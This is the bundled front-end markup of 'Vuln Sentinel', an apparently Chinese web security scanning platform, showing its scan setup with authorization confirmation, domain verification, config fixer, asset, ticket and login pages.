(function(){const i=document.createElement("link").relList;if(i&&i.supports&&i.supports("modulepreload"))return;for(const s of document.querySelectorAll('link[rel="modulepreload"]'))r(s);new MutationObserver(s=>{for(const a of s)if(a.type==="childList")for(const o of a.addedNodes)o.tagName==="LINK"&&o.rel==="modulepreload"&&r(o)}).observe(document,{childList:!0,subtree:!0});function t(s){const a={};return s.integrity&&(a.integrity=s.integrity),s.referrerPolicy&&(a.referrerPolicy=s.referrerPolicy),s.crossOrigin==="use-credentials"?a.credentials="include":s.crossOrigin==="anonymous"?a.credentials="omit":a.credentials="same-origin",a}function r(s){if(s.ep)return;s.ep=!0;const a=t(s);fetch(s.href,a)}})();const Mi=`</head>

<body>

<a href="#page-home" class="skip-link">跳转到主内容</a>



<!-- Skeleton 加载 Screen -->

<div id="skeleton-screen" class="skeleton-screen">

  <div class="skeleton-topbar">

    <div class="skeleton-topbar-logo"></div>

    <div class="skeleton-topbar-line"></div>

  </div>

  <div class="skeleton-search"></div>

  <div class="skeleton-card">

    <div class="skeleton-card-title"></div>

    <div class="skeleton-card-line"></div>

    <div class="skeleton-card-line short"></div>

  </div>

  <div class="skeleton-card">

    <div class="skeleton-card-title"></div>

    <div class="skeleton-card-line"></div>

    <div class="skeleton-card-line short"></div>

  </div>

  <div class="skeleton-card">

    <div class="skeleton-card-title"></div>

    <div class="skeleton-card-line"></div>

    <div class="skeleton-card-line short"></div>

  </div>

</div>





<!-- Toast Container -->

<div class="toast-container" id="toast-container"></div>



<!-- AI Advisor Floating Button -->

<button class="ai-fab" id="ai-fab" onclick="toggleAIChat()" aria-label="打开规则顾问（可选 LLM）" title="规则顾问（可选 LLM）">

  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:22px;height:22px"><path d="M12 2a8 8 0 0 1 8 8v4a8 8 0 0 1-16 0v-4a8 8 0 0 1 8-8z"/><circle cx="9" cy="10" r="1" fill="currentColor"/><circle cx="15" cy="10" r="1" fill="currentColor"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/></svg>

  <span class="ai-fab-badge" id="ai-fab-badge" style="display:none">0</span>

</button>



<!-- AI Advisor Chat Window -->

<div class="ai-chat" id="ai-chat">

  <div class="ai-chat-header">

    <div class="ai-chat-header-info">

      <div class="ai-avatar" style="background:var(--primary);color:#fff;display:flex;align-items:center;justify-content:center;width:28px;height:28px">VS</div>

      <div>

        <div style="font-size:13px;font-weight:600">规则顾问（可选 LLM）</div>

        <div style="font-size:11px;color:#808080">在线服务中</div>

      </div>

    </div>

    <button class="ai-chat-close" onclick="toggleAIChat()" aria-label="关闭">×</button>

  </div>

  <div class="ai-chat-body" id="ai-chat-body">

    <div id="ai-offline-notice" style="display:none;padding:8px 10px;background:#313335;border:1px solid #555555;border-radius:2px;font-size:12px;color:var(--text-secondary);text-align:center;margin-bottom:8px">

      当前使用本地规则引擎；配置 LLM 接口密钥 后回答更精准。

    </div>

    <div class="ai-msg bot">

      规则顾问基于内置知识库工作；配置 LLM 后可获得模型增强回答。它可以解读漏洞、生成修复建议、梳理扫描证据，并提示哪些结果待复测。<br><br>

      快捷问题

    </div>

  </div>

  <div class="ai-quick" id="ai-quick">

    <button onclick="askAIQuick('HSTS 是什么？')">HSTS 是什么</button>

    <button onclick="askAIQuick('怎么修 CSP？')">修复 CSP</button>

    <button onclick="askAIQuick('敏感文件怎么防？')">敏感文件</button>

    <button onclick="askAIQuick('SQL 注入怎么防？')">SQL 注入</button>

    <button onclick="askAIQuick('XSS 是什么？')">XSS 漏洞</button>

  </div>

  <div class="ai-chat-input">

    <input type="text" id="ai-input" placeholder="输入安全问题…" maxlength="200" onkeydown="if(event.key==='Enter')sendAIMessage()" />

    <button onclick="sendAIMessage()" aria-label="发送">发送</button>

  </div>

</div>



<div class="page active" id="page-home" role="main">

  <div class="home-hero card fade-in-up">

    <div class="home-hero-top">
      <div class="home-brand-dot"></div>
      <div class="home-brand-title">Vuln Sentinel</div>
    </div>

    <h1 class="home-hero-title">Vuln Sentinel Web 安全检测平台</h1>
    <div class="home-hero-version">Version 12.0.1</div>

    <div class="home-hero-actions">
      <button onclick="navigateTo('home')" class="home-hero-icon" aria-label="首页">⌂</button>
      <button onclick="navigateTo('scan')" class="home-hero-icon" aria-label="扫描">↗</button>
      <button onclick="navigateTo('profile')" class="home-hero-icon" aria-label="账号">◉</button>
    </div>

    <div class="home-hero-footer">仅用于授权范围内的安全检测、交付复测、整改跟踪与持续巡检。复杂登录态、WAF/CDN 与业务流程结果需人工复核。</div>
  </div>



  <div id="home-onboarding-banner" class="card fade-in-up" style="display:none;margin-top:14px;padding:14px;border:1px solid rgba(75,110,175,0.35);background:linear-gradient(135deg, rgba(75,110,175,0.12), rgba(115,201,144,0.08))">

    <div style="display:flex;justify-content:space-between;gap:16px;align-items:flex-start;flex-wrap:wrap">

      <div style="min-width:240px;flex:1">

        <div style="font-size:13px;font-weight:700;color:var(--text-primary);margin-bottom:6px">3 步开始一次正式检测</div>

        <div style="font-size:12px;color:var(--text-secondary);line-height:1.7">① 输入授权目标并确认范围 → ② 查看风险、证据、影响与整改建议 → ③ 复测、留档并导出正式报告。

        适合客户沟通、交付前验收、持续巡检与复修闭环。</div>

      </div>

      <div style="display:flex;gap:8px;flex-wrap:wrap">

        <button onclick="navigateTo('scan')" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:600">开始扫描</button>

        <button onclick="navigateTo('profile')" style="background:rgba(75,110,175,0.12);color:var(--primary);border:1px solid rgba(75,110,175,0.35);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:600">账号设置</button>

        <button onclick="navigateTo('audit')" style="background:rgba(115,201,144,0.12);color:#73c990;border:1px solid rgba(115,201,144,0.35);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:600">上线审计</button>

        <button onclick="dismissHomeOnboarding()" style="background:transparent;color:var(--text-secondary);border:1px solid var(--border);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:13px">不再提示</button>

      </div>

    </div>

    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px;margin-top:14px">

      <div style="padding:10px 12px;background:rgba(60,63,65,0.7);border:1px solid var(--border);border-radius:2px">

        <div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:4px">适合谁</div>

        <div style="font-size:12px;color:var(--text-secondary);line-height:1.6">安全团队、研发、运维、甲方安全负责人</div>

      </div>

      <div style="padding:10px 12px;background:rgba(60,63,65,0.7);border:1px solid var(--border);border-radius:2px">

        <div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:4px">产出什么</div>

        <div style="font-size:12px;color:var(--text-secondary);line-height:1.6">可直接用于客户、管理层与研发协同的正式结果报告</div>

      </div>

      <div style="padding:10px 12px;background:rgba(60,63,65,0.7);border:1px solid var(--border);border-radius:2px">

        <div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:4px">闭环能力</div>

        <div style="font-size:12px;color:var(--text-secondary);line-height:1.6">扫描、证据、修复、验证、工单、复测一条线打通</div>

      </div>

    </div>

  </div>



  <!-- 核心数据总览 -->

  <div class="card fade-in-up dashboard-stats" style="margin-top:14px;padding:12px;background:#3c3f41;border:1px solid #555555">

    <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;text-align:center">

      <div class="stat-cell">

        <div class="stat-value" style="color:#73c990" id="home-stat-scan-count">-</div>

        <div class="stat-label">总扫描次数</div>

        <div class="stat-sub">真实运行记录</div>

      </div>

      <div class="stat-cell">

        <div class="stat-value" style="color:#4b6eaf" id="home-stat-high-risk">-</div>

        <div class="stat-label">高风险发现</div>

        <div class="stat-sub">需要优先处理</div>

      </div>

      <div class="stat-cell">

        <div class="stat-value" style="color:#f0a732" id="home-stat-fixed-count">-</div>

        <div class="stat-label">已修复项</div>

        <div class="stat-sub">复测确认关闭</div>

      </div>

      <div class="stat-cell">

        <div class="stat-value" style="color:#c75450" id="home-stat-score">-</div>

        <div class="stat-label">最近评分</div>

        <div class="stat-sub">最近一次扫描</div>

      </div>

    </div>

  </div>



  <!-- 11-S: 技术亮点（最醒目的位置） -->

  <div class="card fade-in-up" style="margin-top:18px;background:#3c3f41;border:1px solid #555555;border-radius:2px;overflow:hidden">

    <!-- 顶部标题栏 -->

    <div style="padding:12px 12px 10px;background:#313335;border-bottom:1px solid #555555">

      <div style="display:flex;align-items:center;gap:10px">

        <div style="flex:1">

          <div style="font-size:13px;font-weight:600;color:#bbbbbb">交付闭环：体检 → 证据定位 → 修复建议 → 复测验证 → 报告留档</div>

          <div style="font-size:11px;color:#808080;margin-top:2px">多平台修复建议 · 证据分层展示 · 导出客户交付报告</div>

        </div>

        <span style="font-size:10px;background:#4b6eaf;color:#fff;padding:2px 8px;border-radius:2px;font-weight:600">11-S 核心能力</span>

      </div>

    </div>

    <!-- 三大技术亮点 -->

    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:#555555;margin:0">

      <div style="padding:12px 10px;background:#3c3f41;text-align:center">

        <div style="font-size:12px;font-weight:600;color:#bbbbbb;margin-bottom:4px">置信度分级</div>

        <div style="font-size:11px;color:#808080;line-height:1.5">高/中/低三级标注<br>辅助优先级排序</div>

      </div>

      <div style="padding:12px 10px;background:#3c3f41;text-align:center">

        <div style="font-size:12px;font-weight:600;color:#bbbbbb;margin-bottom:4px">反馈闭环</div>

          <div style="font-size:11px;color:#808080;line-height:1.5">用户反馈结果<br>持续优化检测模型</div>

      </div>

      <div style="padding:12px 10px;background:#3c3f41;text-align:center">

        <div style="font-size:12px;font-weight:600;color:#bbbbbb;margin-bottom:4px">安全闭环</div>

        <div style="font-size:11px;color:#808080;line-height:1.5">体检 → 风险定位 → 修复建议 → 复测 → 交付</div>

      </div>

    </div>

    <!-- 本地扫描入口（登录后显示） -->

  </div>



  <!-- 风险趋势图 -->

  <div class="card fade-in-up" style="margin-top:18px">

    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">

      <strong style="font-size:14px;color:var(--text-primary)">风险趋势</strong>

      <div style="display:flex;gap:6px">

        <button onclick="loadTrendChart(7)" class="trend-range" data-days="7" style="padding:4px 10px;min-height:0;font-size:12px;border:1px solid #555555;background:#45494a;border-radius:2px;cursor:pointer;color:#808080;font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace">7天</button>

        <button onclick="loadTrendChart(30)" class="trend-range" data-days="30" style="padding:4px 10px;min-height:0;font-size:12px;border:1px solid #555555;background:#45494a;border-radius:2px;cursor:pointer;color:#808080;font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace">30天</button>

      </div>

    </div>

    <div id="trend-chart" style="min-height:120px;display:flex;align-items:center;justify-content:center;color:var(--text-secondary);font-size:12px">扫描几个目标后，即可查看分数变化趋势。</div>

  </div>





  <section id="scan-section" class="scan-section card fade-in-up" style="animation-delay:0.1s">

    <h2 class="card-title">安全扫描</h2>

    <p class="card-desc">输入授权目标并确认范围后开始体检，结果会进入报告、审计和复测闭环。</p>



    <!-- 仪表盘概览（已登录时显示） -->

    <div id="dashboard-overview" style="display:none;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px">

      <div class="stat-card" style="background:#313335;padding:12px;border:1px solid #555555;border-radius:2px;text-align:center"><div style="font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace;font-size:22px;font-weight:600;color:#4b6eaf" id="stat-total">-</div><div style="font-size:11px;color:#808080;margin-top:6px;text-transform:uppercase;letter-spacing:0.3px">总扫描次数</div></div>

      <div class="stat-card" style="background:#313335;padding:12px;border:1px solid #555555;border-radius:2px;text-align:center"><div style="font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace;font-size:22px;font-weight:600;color:#c75450" id="stat-high">-</div><div style="font-size:11px;color:#808080;margin-top:6px;text-transform:uppercase;letter-spacing:0.3px">高风险</div></div>

      <div class="stat-card" style="background:#313335;padding:12px;border:1px solid #555555;border-radius:2px;text-align:center"><div style="font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace;font-size:22px;font-weight:600;color:#73c990" id="stat-fixed">-</div><div style="font-size:11px;color:#808080;margin-top:6px;text-transform:uppercase;letter-spacing:0.3px">已修复</div></div>

      <div class="stat-card" style="background:#313335;padding:12px;border:1px solid #555555;border-radius:2px;text-align:center"><div style="font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace;font-size:22px;font-weight:600;color:#f0a732" id="stat-score">-</div><div style="font-size:11px;color:#808080;margin-top:6px;text-transform:uppercase;letter-spacing:0.3px">最近评分</div></div>

    </div>



    <!-- 11-S: 安全趋势面板 -->

    <div id="trend-panel" style="display:none;margin-bottom:20px">

      <div class="card" style="padding:16px">

        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">

          <div style="display:flex;align-items:center;gap:8px">

            <h3 style="margin:0;font-size:15px;font-weight:700">安全评分趋势</h3>

          </div>

          <div id="trend-summary" style="display:flex;gap:12px;flex-wrap:wrap"></div>

        </div>

        <div id="trend-chart-container" style="position:relative;width:100%;height:200px;background:#313335;border:1px solid #555555;border-radius:2px;overflow:hidden">

          <canvas id="trend-canvas" style="width:100%;height:100%"></canvas>

          <div id="trend-empty" style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:var(--text-secondary);font-size:13px">暂无扫描数据，完成首次扫描后即可查看趋势</div>

        </div>

        <div id="trend-legend" style="display:flex;gap:12px;margin-top:10px;flex-wrap:wrap"></div>

      </div>

    </div>



    <!-- Step 1: Input URL -->

    <div id="verify-step-1" class="verify-step">

      <div class="verify-step-header">

        <span class="verify-num">1</span>

        <span>输入目标网址</span>

      </div>

      <div class="scan-input-wrap">

        <input id="scan-url" type="url" placeholder="例如：https://示例.com" aria-label="目标网址" oninput="updateScanStartState()" />

      </div>

      <div id="scan-login-tip" style="background:#313335;border:1px solid #555555;border-radius:2px;padding:10px 14px;margin-bottom:10px;text-align:center;display:none">

        <div style="font-size:12px;color:var(--text-secondary);margin-bottom:6px">登录后即可开始体检，结果会自动进入报告、工单和审计记录</div>

        <button onclick="navigateTo('profile')" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:6px 18px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:500">立即登录 / 注册</button>

      </div>

      <div id="scan-credits-hint" style="display:none;background:rgba(75,110,175,0.08);border:1px solid rgba(75,110,175,0.25);border-radius:2px;padding:10px 14px;margin-bottom:10px;font-size:12px;color:var(--text-secondary);line-height:1.6">

        <strong style="color:var(--primary)">额度提示</strong><br/>

        当前额度：<span id="scan-credits-value">--</span> · 标准扫描消耗 1 · 深度扫描消耗 3

      </div>

      <label class="scan-checkbox" style="margin-bottom:12px">

        <input id="auth-check-step1" type="checkbox" onchange="updateScanStartState()" />

        <span>我已确认目标属于授权范围，不涉及受限目标</span>

      </label>

      <button class="scan-btn" id="scan-btn-step1" onclick="startScanDirect()" disabled>开始体检并生成报告</button>

      <div style="text-align:center;margin-top:10px">

        <button onclick="goVerifyStep2()" style="background:none;border:none;color:var(--primary);font-size:13px;padding:8px;cursor:pointer">域名归属验证（推荐）</button>

        <div style="font-size:12px;color:var(--text-secondary);margin-top:4px">快速演示仅适用于自有目标或授权场景，正式交付建议完成归属验证与复测留档</div>

      </div>

      <div style="text-align:center;margin-top:8px">

        <button onclick="showBatchScanModal()" style="background:none;border:1px dashed var(--border);color:var(--text-secondary);padding:8px 16px;border-radius:2px;cursor:pointer;font-size:12px;width:100%">批量体检（一次最多 5 个 URL，适合交付前巡检）</button>

      </div>

    </div>



    <!-- Step 2: Generate Verification 令牌 -->

    <div id="verify-step-2" class="verify-step" style="display:none">

      <div class="verify-step-header">

        <span class="verify-num">2</span>

        <span>域名归属验证</span>

      </div>

      <p class="verify-desc">请选择一种验证方式，在目标网站添加以下验证信息：</p>

      <div class="令牌-box">

        <label>验证 令牌</label>

        <code id="verify-令牌">vuln-sentinel-xxxx</code>

        <button class="令牌-copy-btn" onclick="copyToken()" aria-label="复制验证令牌">复制</button>

      </div>

      <div class="verify-methods">

        <div class="verify-method" onclick="selectVerifyMethod(this, 'dns')">

          <strong>DNS TXT 验证</strong>

          <p>添加 TXT 记录：<code id="dns-record">_vuln-sentinel.example.com TXT "vuln-sentinel-xxxx"</code></p>

        </div>

        <div class="verify-method" onclick="selectVerifyMethod(this, 'file')">

          <strong>网站文件验证</strong>

          <p>在网站根目录创建文件：<code>vuln-sentinel-verification.txt</code>，内容为 令牌</p>

        </div>

      </div>

      <div class="verify-method-selected" id="verify-method-info">

        <p>选择一种验证方式</p>

      </div>

      <button class="scan-btn" onclick="confirmVerification()" id="verify-confirm-btn" disabled>已添加验证信息，确认验证</button>

      <button onclick="skipVerification()" id="verify-skip-btn" style="background:none;border:none;color:var(--primary);font-size:13px;padding:10px;margin-top:6px;cursor:pointer;width:100%;text-align:center">快速测试（跳过 DNS/文件验证）</button>

    </div>



    <!-- Step 3: Ready to Scan -->

    <div id="verify-step-3" class="verify-step" style="display:none">

      <div class="verify-step-header done">

        <span class="verify-num done">OK</span>

        <span>准备开始扫描</span>

      </div>

      <div class="verify-passed">

        <p>已确认目标网址，勾选授权声明后开始扫描。</p>

        <div class="scan-input-wrap">

          <input id="scan-url-confirmed" type="url" readonly aria-label="已确认的目标网址" />

        </div>

        <label class="scan-checkbox">

          <input id="auth-check" type="checkbox" onchange="updateScanStartState()" />

          <span>我已确认目标属于授权范围，不涉及受限目标</span>

        </label>

        <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px;flex-wrap:wrap">

          <span style="font-size:13px;color:var(--text-secondary)">扫描深度：</span>

          <div id="scan-depth-group" style="display:inline-flex;border:1px solid var(--border);border-radius:2px;overflow:hidden">

            <label class="scan-depth-opt" data-value="quick" style="padding:6px 12px;cursor:pointer;font-size:12px;background:var(--bg);color:var(--text);border:none;user-select:none;-webkit-tap-highlight-color:transparent">

              <input type="radio" name="scan-depth" value="quick" style="position:absolute;opacity:0;pointer-events:none;width:0;height:0" /> 快速

            </label>

            <label class="scan-depth-opt active" data-value="standard" style="padding:6px 12px;cursor:pointer;font-size:12px;background:var(--primary);color:#fff;border:none;user-select:none;-webkit-tap-highlight-color:transparent">

              <input type="radio" name="scan-depth" value="standard" style="position:absolute;opacity:0;pointer-events:none;width:0;height:0" checked /> 标准

            </label>

            <label class="scan-depth-opt" data-value="deep" style="padding:6px 12px;cursor:pointer;font-size:12px;background:var(--bg);color:var(--text);border:none;user-select:none;-webkit-tap-highlight-color:transparent">

              <input type="radio" name="scan-depth" value="deep" style="position:absolute;opacity:0;pointer-events:none;width:0;height:0" /> 深度

            </label>

          </div>

          <span id="depth-hint" style="font-size:12px;color:var(--text-secondary);margin-left:4px">约 3-5 秒 · 推荐</span>

        </div>

        <button class="scan-btn" id="scan-btn" onclick="startScan()" disabled>开始体检并生成报告</button>

      </div>

    </div>

  </section>



  <!-- 公开样例报告 -->

  <div class="card public-report-card" id="public-report-card" style="margin-top:18px">

    <div class="card-title" style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px">

      <div>

        <span style="font-size:13px">公开样例报告</span>

        <span style="font-size:12px;color:var(--text-secondary);margin-left:8px">无需登录，查看公开站点的样例检测结果</span>

      </div>

      <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap">

        <select id="public-report-host" onchange="loadPublicDemo()" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:5px 10px;border-radius:2px;font-size:12px;cursor:pointer">

          <option value="https://example.com">example.com</option>

          <option value="https://www.iana.org">iana.org</option>

          <option value="https://httpbin.org">httpbin.org</option>

          <option value="https://testphp.vulnweb.com">testphp.vulnweb.com（样例站点）</option>

        </select>

        <button onclick="loadPublicDemo()" id="public-report-refresh" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:5px 12px;border-radius:2px;font-size:12px;cursor:pointer;font-weight:500">刷新报告</button>

      </div>

    </div>

    <div id="public-report-content">

      <div style="padding:16px;text-align:center;color:var(--text-secondary);background:var(--bg);border-radius:2px;margin-top:12px;border:1px dashed var(--border)">

        <div style="font-size:12px;margin-bottom:8px;color:var(--text)">选择公开样例站点，立即查看检测结果</div>

        <div style="margin-top:10px"><button onclick="loadPublicDemo()" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:6px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:500">查看样例报告</button></div>

      </div>

    </div>

  </div>

</div>



<div class="page" id="page-result">

  <div class="workbench-header">

    <h1 class="workbench-title">扫描结果</h1>

    <span class="workbench-subtitle">查看风险发现、证据详情与整改建议</span>

  </div>

  <button class="back-btn" onclick="navigateTo('home')" style="margin-bottom:12px">返回首页</button>

  <div id="result-content"></div>

</div>



<div class="page" id="page-fixer">

  <div class="workbench-header">

    <h1 class="workbench-title">修复器</h1>

    <span class="workbench-subtitle">检查配置文件并生成安全加固补丁</span>

  </div>

  <button class="back-btn" onclick="navigateTo('home')" style="margin-bottom:12px">返回首页</button>



  <div class="card" style="margin-bottom:16px">

    <div class="card-title">输入配置</div>

    <p class="card-desc" style="margin-bottom:12px">粘贴 Nginx/Apache 配置文件，检测安全问题并生成修复补丁。</p>

    <textarea id="fixer-input" class="fixer-textarea" placeholder="粘贴服务器配置文件...&#10;&#10;例如：&#10;server {&#10;    listen 80;&#10;    server_name example.com;&#10;    ...&#10;}"></textarea>

    <div class="fixer-btns">

      <button class="fixer-btn primary" id="fixer-analyze-btn" onclick="analyzeFixer()">检查配置</button>

      <button class="fixer-btn secondary" onclick="loadSampleConfig()">载入参考配置</button>

      <button class="fixer-btn secondary" onclick="clearFixer()">清空</button>

    </div>

  </div>



  <div class="card" id="fixer-scan-prompt">

    <div class="card-title">使用上次扫描结果</div>

    <p style="font-size:13px;color:var(--text-secondary);line-height:1.8">

      1. 在<strong>扫描</strong>页面完成网站安全扫描<br>

      2. 扫描结果页点击<strong>"生成修复配置"</strong><br>

      3. 此处自动生成 Nginx、Python、Node.js、Apache 修复代码

    </p>

    <div class="fixer-btns" style="margin-top:12px">

      <button class="fixer-btn primary" id="goto-fixer-btn" onclick="goToFixerWithScanResult()" aria-label="生成修复配置">使用上次扫描结果生成</button>

    </div>

  </div>



  <div id="fixer-lang-tabs" style="display:none;margin:16px 0">

    <div style="display:flex;gap:6px;flex-wrap:wrap">

      <button class="fixer-btn primary lang-tab active" data-lang="nginx" onclick="switchFixLang('nginx')">Nginx</button>

      <button class="fixer-btn secondary lang-tab" data-lang="python" onclick="switchFixLang('python')">Python</button>

      <button class="fixer-btn secondary lang-tab" data-lang="nodejs" onclick="switchFixLang('nodejs')">Node.js</button>

      <button class="fixer-btn secondary lang-tab" data-lang="apache" onclick="switchFixLang('apache')">Apache</button>

    </div>

  </div>



  <div id="fixer-result"></div>

</div>



<!-- 进化页面 11-S -->

<div class="page" id="page-evolution">

  <div class="workbench-header">

    <h1 class="workbench-title">进化中心</h1>

    <span class="workbench-subtitle">历史学习与持续监控</span>

  </div>

  <div id="evolution-content" style="min-height:400px"></div>

</div>



<!-- 资产管理页面 -->

<div class="page" id="page-assets">

  <div class="workbench-header">

    <h1 class="workbench-title">资产管理</h1>

    <span class="workbench-subtitle">管理网站域名资产与扫描状态</span>

  </div>



  <!-- 添加资产表单 -->

  <div class="card" style="margin-bottom:16px">

    <div class="card-title">添加资产</div>

    <div class="settings-row-static" style="padding:14px 0 0 0;border-bottom:none;flex-wrap:wrap">

      <div style="flex:1;min-width:200px">

        <label style="display:block;font-size:12px;color:var(--text-secondary);margin-bottom:4px">域名</label>

        <input type="text" id="asset-domain" placeholder="示例.com" style="width:100%;padding:8px 10px;border:1px solid #646464;border-radius:2px;background:#45494a;color:#bbbbbb;font-size:13px" />

      </div>

      <div style="flex:1;min-width:160px">

        <label style="display:block;font-size:12px;color:var(--text-secondary);margin-bottom:4px">负责人</label>

        <input type="text" id="asset-owner" placeholder="负责人姓名" style="width:100%;padding:8px 10px;border:1px solid #646464;border-radius:2px;background:#45494a;color:#bbbbbb;font-size:13px" />

      </div>

      <div style="flex:2;min-width:200px">

        <label style="display:block;font-size:12px;color:var(--text-secondary);margin-bottom:4px">描述</label>

        <input type="text" id="asset-description" placeholder="资产描述（可选）" style="width:100%;padding:8px 10px;border:1px solid #646464;border-radius:2px;background:#45494a;color:#bbbbbb;font-size:13px" />

      </div>

      <button class="fixer-btn primary" data-action="add-asset" style="height:32px;padding:0 16px">添加</button>

    </div>

    <div id="asset-form-error" style="color:var(--danger);font-size:12px;margin-top:8px;display:none"></div>

  </div>



  <!-- 资产列表 -->

  <div class="card" id="asset-list-container">

    <div class="card-title">资产列表</div>

    <div id="asset-list" style="margin-top:10px"></div>

    <div id="asset-empty" class="ticket-empty" style="display:none">

      <div class="ticket-empty-icon"></div>

      <p>暂无资产</p>

      <p class="ticket-empty-hint">添加域名资产后可跟踪扫描状态</p>

    </div>

  </div>

</div>



<!-- 修复工单页面 -->

<div class="page" id="page-tickets">

  <div class="workbench-header">

    <h1 class="workbench-title">修复工单</h1>

    <span class="workbench-subtitle">跟踪和管理扫描发现的安全问题</span>

  </div>



  <!-- 状态标签页 -->

  <div class="ticket-tabs">

    <button class="ticket-tab active" data-action="switch-ticket-tab" data-status="pending">待修复</button>

    <button class="ticket-tab" data-action="switch-ticket-tab" data-status="in_progress">修复中</button>

    <button class="ticket-tab" data-action="switch-ticket-tab" data-status="fixed">已修复</button>

    <button class="ticket-tab" data-action="switch-ticket-tab" data-status="ignored">已忽略</button>

  </div>



  <!-- 批量操作 -->

  <div class="ticket-batch" id="ticket-batch-bar" style="display:none">

    <label class="ticket-batch-label"><input type="checkbox" id="ticket-select-all" data-action="toggle-select-all"> 全选</label>

    <span id="ticket-selected-count" class="ticket-selected-count">已选 0 项</span>

    <div class="ticket-batch-actions">

      <button class="ticket-batch-btn" data-action="batch-update" data-status="in_progress">标记修复中</button>

      <button class="ticket-batch-btn" data-action="batch-update" data-status="fixed">标记已修复</button>

      <button class="ticket-batch-btn secondary" data-action="batch-export">导出摘要</button>

      <button class="ticket-batch-btn secondary" data-action="batch-update" data-status="ignored">标记已忽略</button>

      <button class="ticket-batch-btn danger" data-action="batch-delete">删除</button>

    </div>

  </div>



  <!-- 工单工作台：左侧列表 / 右侧详情 -->

  <div class="ticket-workbench" id="ticket-workbench" style="display:none">

    <div class="ticket-list-panel">

      <div class="ticket-list-header">工单列表</div>

      <div class="ticket-table-wrap">

        <table class="ticket-table" id="ticket-table">

          <thead><tr><th style="width:30px"><input type="checkbox" id="ticket-select-all-table" data-action="toggle-select-all"></th><th>发现项</th><th>等级</th><th>状态</th><th>创建时间</th></tr></thead>

          <tbody id="ticket-list"></tbody>

        </table>

      </div>

    </div>

    <div class="ticket-detail-panel" id="ticket-detail-panel">

      <div class="ticket-detail-empty">选择左侧工单查看详情</div>

    </div>

  </div>



  <!-- 空状态 -->

  <div id="ticket-empty" class="ticket-empty" style="display:none">

    <div class="ticket-empty-icon"></div>

    <p>该状态下暂无工单</p>

    <p class="ticket-empty-hint">完成扫描后，高危/严重问题会自动创建工单，也可以从结果页手动转工单。</p>

    <div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-top:12px">

      <button class="fixer-btn primary" onclick="navigateTo('home')">去看报告</button>

      <button class="fixer-btn secondary" onclick="navigateTo('scan')">开始体检</button>

    </div>

  </div>

</div>



<div class="page" id="page-profile">

  <div class="workbench-header">

    <h1 class="workbench-title">设置</h1>

    <span class="workbench-subtitle">账号、主题与系统配置</span>

  </div>



  <!-- 登录/注册区域 -->

  <div id="auth-section">

    <!-- 未登录：显示登录/注册表单 -->

    <div id="auth-guest" style="display:none">

      <div class="card auth-form">

        <h3>账号登录</h3>

        <div class="auth-form-error" id="login-error"></div><div id="auth-status-message" class="auth-form-hint" style="margin-top:8px;color:var(--text-secondary)">可用受控测试账号登录，或直接使用你的账号。</div>

        <div class="auth-form-row">

          <input type="text" id="login-username" placeholder="用户名" aria-label="用户名" />

        </div>

        <div class="auth-form-row">

          <label for="login-password" class="sr-only">密码</label><input type="password" id="login-password" aria-label="密码" placeholder="密码" />

        </div>

        <div class="auth-form-row">

          <div id="auth-challenge-question" class="auth-form-hint" style="margin-bottom:8px">验证码加载中...</div>
          <input type="hidden" id="auth-challenge-token" />
          <input type="text" id="login-challenge-answer" placeholder="验证码答案（30秒有效）" aria-label="验证码答案（30秒有效）" />

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn" style="flex:1" onclick="doLogin()">登 录</button>

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="toggleAuthForm('reset')">找回密码</button>

        </div>

        <div class="auth-form-switch">

          <a onclick="toggleAuthForm('reset')">找回密码</a> · <a onclick="toggleAuthForm('register')">立即注册</a>

        </div>

      </div>

    </div>



    <!-- 重置密码表单 -->

    <div id="auth-reset" style="display:none">

      <div class="card auth-form">

        <h3>修改密码</h3>

        <div class="auth-form-error" id="reset-error"></div>

        <div class="auth-form-row">

          <input type="password" id="reset-new-password" placeholder="新密码（至少6位）" aria-label="新密码" />

        </div>

        <div class="auth-form-row">

          <input type="password" id="reset-new-password2" placeholder="确认新密码" aria-label="确认新密码" />

        </div>

        <div class="auth-form-row">

          <input type="text" id="reset-password-token" placeholder="重置令牌" aria-label="重置令牌" />

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn" style="flex:1" onclick="doResetPassword()">确认重置</button>

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="toggleAuthForm('login')">返回登录</button>

        </div>

        <div class="auth-form-switch">

          <a onclick="toggleAuthForm('login')">返回登录</a>

